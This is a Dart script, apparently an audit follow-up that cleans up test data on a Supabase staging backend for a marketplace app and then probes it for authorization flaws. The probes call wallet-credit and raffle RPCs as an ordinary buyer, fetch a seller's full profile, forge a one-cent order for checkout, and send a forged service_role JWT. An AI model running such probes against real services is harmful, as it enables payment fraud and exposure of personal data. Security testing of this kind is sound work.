/// Cleanup + follow-up probes after independent audit.
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

void main() async {
  final env = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  final anon = envRequire(env, 'SUPABASE_ANON_KEY');
  final sb = LiveOpsStagingClient(
    url: url,
    anonKey: anon,
    serviceRoleKey: envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY'),
  );
  final buyerId = envRequire(env, 'LIVE_OPS_TEST_BUYER_ID');
  final sellerId = envRequire(env, 'LIVE_OPS_TEST_SELLER_ID');
  final buyerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  stdout.writeln('buyer jwt ok');

  // --- observe wallets / txs ---
  final bw = await sb.select('wallets', filter: 'id=eq.$buyerId', limit: 1);
  final sw = await sb.select('wallets', filter: 'id=eq.$sellerId', limit: 1);
  stdout.writeln('buyer_wallet=${jsonEncode(bw)}');
  stdout.writeln('seller_wallet=${jsonEncode(sw)}');

  final txs = await sb.select(
    'wallet_transactions',
    filter: 'wallet_id=eq.$buyerId',
    limit: 10,
  );
  stdout.writeln('buyer_txs=${jsonEncode(txs)}');

  final txsS = await sb.select(
    'wallet_transactions',
    filter: 'wallet_id=eq.$sellerId',
    limit: 5,
  );
  stdout.writeln('seller_txs_sample_len=${txsS.length}');

  // --- cleanup minted 12.34 (dados de teste do probe) ---
  try {
    await sb.patch('wallets', 'id=eq.$buyerId', {'balance': 0});
    stdout.writeln('CLEANUP wallet buyer balance -> 0');
  } catch (e) {
    stdout.writeln('CLEANUP wallet patch FAIL $e');
  }

  for (final t in txs) {
    final note = '${t['description'] ?? t['note'] ?? ''} ${t['type'] ?? ''}';
    if (note.toLowerCase().contains('parcial') ||
        note.toLowerCase().contains('reembolso')) {
      try {
        await sb.deleteWhere('wallet_transactions', 'id=eq.${t['id']}');
        stdout.writeln('CLEANUP tx ${t['id']}');
      } catch (e) {
        stdout.writeln('CLEANUP tx FAIL ${t['id']} $e');
      }
    }
  }

  // restore buyer type
  try {
    await sb.patch('profiles', 'id=eq.$buyerId', {'user_type': 'comprador'});
    stdout.writeln('CLEANUP user_type -> comprador');
  } catch (e) {
    stdout.writeln('CLEANUP user_type FAIL $e');
  }

  // end mux live created by probe
  final lives = await sb.select(
    'lives',
    filter: 'vendedor_id=eq.$buyerId',
    limit: 10,
  );
  stdout.writeln('buyer_lives=${lives.map((e) => {
        'id': e['id'],
        'status': e['status'],
        'is_active': e['is_active'],
        'title': e['title'],
      }).toList()}');
  for (final live in lives) {
    final id = live['id'];
    try {
      await sb.patch('lives', 'id=eq.$id', {
        'status': 'ended',
        'is_active': false,
      });
      stdout.writeln('CLEANUP live ended $id');
    } catch (e) {
      stdout.writeln('CLEANUP live FAIL $id $e');
    }
  }

  final h = {
    'apikey': anon,
    'Authorization': 'Bearer $buyerJwt',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };

  Future<void> hit(String name, Future<http.Response> f) async {
    final r = await f;
    final b = r.body.replaceAll('\n', ' ');
    stdout.writeln(
      '[$name] HTTP ${r.statusCode} ${b.length > 320 ? '${b.substring(0, 320)}…' : b}',
    );
  }

  // OpenAPI RPC names (anon may 401)
  await hit(
    'OPENAPI',
    http.get(Uri.parse('$url/rest/v1/'), headers: {
      'apikey': anon,
      'Authorization': 'Bearer $buyerJwt',
      'Accept': 'application/openapi+json',
    }),
  );

  // award tickets correct names
  await hit(
    'AWARD_TICKETS_CORRECT',
    http.post(
      Uri.parse('$url/rest/v1/rpc/batata_award_live_raffle_tickets'),
      headers: h,
      body: jsonEncode({
        'p_raffle_id': '00000000-0000-0000-0000-000000000001',
        'p_user_id': buyerId,
        'p_action_type': 'audit',
        'p_tickets_delta': 99,
        'p_source_id': 'x',
        'p_metadata': <String, dynamic>{},
      }),
    ),
  );

  await hit(
    'CREATE_PRIZE_CORRECT',
    http.post(
      Uri.parse('$url/rest/v1/rpc/batata_create_raffle_prize_order'),
      headers: h,
      body: jsonEncode({
        'p_raffle_id': '00000000-0000-0000-0000-000000000001',
        'p_winner_uid': buyerId,
        'p_rank': 1,
      }),
    ),
  );

  await hit(
    'CREDIT_WALLET_POSITIONAL',
    http.post(
      Uri.parse('$url/rest/v1/rpc/batata_credit_wallet_once'),
      headers: h,
      body: jsonEncode([buyerId, '00000000-0000-0000-0000-000000000001', 1, 'reembolso', 'x']),
    ),
  );

  // seller PII
  await hit(
    'SELLER_PROFILE_STAR',
    http.get(
      Uri.parse('$url/rest/v1/profiles?select=*&id=eq.$sellerId'),
      headers: h,
    ),
  );
  await hit(
    'DIRECTORY',
    http.get(
      Uri.parse('$url/rest/v1/profiles_directory_public?select=*&limit=2'),
      headers: h,
    ),
  );

  // checkout with shipping on forged cheap order
  final ins = await http.post(
    Uri.parse('$url/rest/v1/orders'),
    headers: h,
    body: jsonEncode({
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': '8e0cdc69-74de-4bd1-b09e-dd9e424ff74a',
      'price_total': 0.01,
      'quantity': 1,
      'status': 'reserva_pendente',
      'shipping_method': 'Transportadora 3,50 €',
      'payment_method': 'Pagamento na app',
    }),
  );
  stdout.writeln('[FORGE_ORDER2] HTTP ${ins.statusCode} ${ins.body.substring(0, ins.body.length.clamp(0, 250))}');
  String? oid;
  try {
    final list = jsonDecode(ins.body);
    if (list is List && list.isNotEmpty) oid = list.first['id']?.toString();
  } catch (_) {}

  if (oid != null) {
    await hit(
      'CHECKOUT_FORGED_PRICE',
      http.post(
        Uri.parse('$url/functions/v1/create-payment-intent'),
        headers: {
          'apikey': anon,
          'Authorization': 'Bearer $buyerJwt',
          'Content-Type': 'application/json',
        },
        body: jsonEncode({
          'order_id': oid,
          'buyer_id': buyerId,
          'shipping_method': 'transportadora',
          'amount': 1,
        }),
      ),
    );

    // checkout cancelled
    await sb.patch('orders', 'id=eq.$oid', {'status': 'cancelado'});
    await hit(
      'CHECKOUT_CANCELLED',
      http.post(
        Uri.parse('$url/functions/v1/create-payment-intent'),
        headers: {
          'apikey': anon,
          'Authorization': 'Bearer $buyerJwt',
          'Content-Type': 'application/json',
        },
        body: jsonEncode({
          'order_id': oid,
          'buyer_id': buyerId,
          'shipping_method': 'transportadora',
        }),
      ),
    );

    try {
      await sb.deleteWhere('orders', 'id=eq.$oid');
      stdout.writeln('CLEANUP order $oid');
    } catch (e) {
      stdout.writeln('CLEANUP order FAIL $e');
    }
  }

  // GET settle garbage session
  await hit(
    'GET_SETTLE_FAKE_SESSION',
    http.get(
      Uri.parse(
        '$url/functions/v1/create-payment-intent?checkout_return=success&session_id=cs_test_fake',
      ),
      headers: {'apikey': anon, 'Authorization': 'Bearer $anon'},
    ),
  );

  // forged HS256 jwt (not alg none) for e2e
  final payload = base64Url
      .encode(utf8.encode(jsonEncode({
        'role': 'service_role',
        'iss': 'supabase',
        'ref': 'fxdknzrqjenzqcvnwqqq',
      })))
      .replaceAll('=', '');
  final hdr = base64Url
      .encode(utf8.encode(jsonEncode({'alg': 'HS256', 'typ': 'JWT'})))
      .replaceAll('=', '');
  final fake = '$hdr.$payload.fakesig';
  await hit(
    'FASE2_HS256_FORGED',
    http.post(
      Uri.parse('$url/functions/v1/create-payment-intent?fase2_e2e_settle=1'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $fake',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({
        'order_id': '00000000-0000-0000-0000-000000000001',
        'payment_intent_id': 'pi_x',
      }),
    ),
  );

  final after = await sb.select('wallets', filter: 'id=eq.$buyerId', limit: 1);
  final prof = await sb.select('profiles', filter: 'id=eq.$buyerId', limit: 1);
  stdout.writeln('AFTER_CLEANUP wallet=${jsonEncode(after)} type=${prof.first['user_type']}');
}
